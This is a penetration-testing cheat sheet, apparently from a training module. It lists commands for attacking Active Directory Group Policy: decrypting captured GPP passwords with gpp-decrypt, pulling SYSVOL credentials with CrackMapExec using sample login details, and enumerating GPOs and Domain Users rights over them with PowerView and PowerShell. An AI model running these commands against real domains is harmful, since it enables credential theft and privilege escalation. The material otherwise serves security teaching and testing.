# Group Policy Enumeration & Attacks

***

| Command                                                               | Description                                                                                                                                                             |
| --------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`             | Tool used to decrypt a captured `group policy preference password` from a Linux-based host.                                                                             |
| `crackmapexec smb -L \| grep gpp`                                     | Locates and retrieves a `group policy preference password` using `CrackMapExec`, the filters the output using `grep`. Peformed from a Linux-based host.                 |
| `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin` | Locates and retrieves any credentials stored in the `SYSVOL` share of a Windows target using `CrackMapExec` from a Linux-based host.                                    |
| `Get-DomainGPO \| select displayname`                                 | PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.                                                                        |
| `Get-GPO -All \| Select DisplayName`                                  | PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.                                                                                    |
| `$sid=Convert-NameToSid "Domain Users"`                               | Creates a variable called `$sid` that is set equal to the `Convert-NameToSid` tool and specifies the group account `Domain Users`. Performed from a Windows-based host. |
| `Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid`  | PowerView tool that is used to check if the `Domain Users` (`eq $sid`) group has any rights over one or more GPOs. Performed from a Windows-based host.                 |
| `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`                  | PowerShell cmd-let used to display the name of a GPO given a `GUID`. Performed from a Windows-based host.                                                               |
